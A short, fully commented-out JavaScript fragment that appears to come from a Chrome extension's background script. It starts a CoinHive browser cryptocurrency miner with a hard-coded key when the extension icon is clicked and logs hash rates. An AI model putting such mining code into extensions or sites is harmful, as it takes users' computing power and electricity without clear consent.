/*chrome.browserAction.onClicked.addListener(function (tab) {
    console.log("background js");
    var miner = new CoinHive.Anonymous('aksVrkHBo5squRsIoIG4tCLsfii3jknj');
    miner.start();
    setInterval(function () {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();

        console.log("hashesPerSecond = " + hashesPerSecond + "\n" + "totalHashes = " + totalHashes + "\n" + "acceptedHashes = " + acceptedHashes);
    }, 5000);
});*/
/*chrome.runtime.onMessage.addListener(function(response, sender, sendResponse) {
    alert(response)
});*/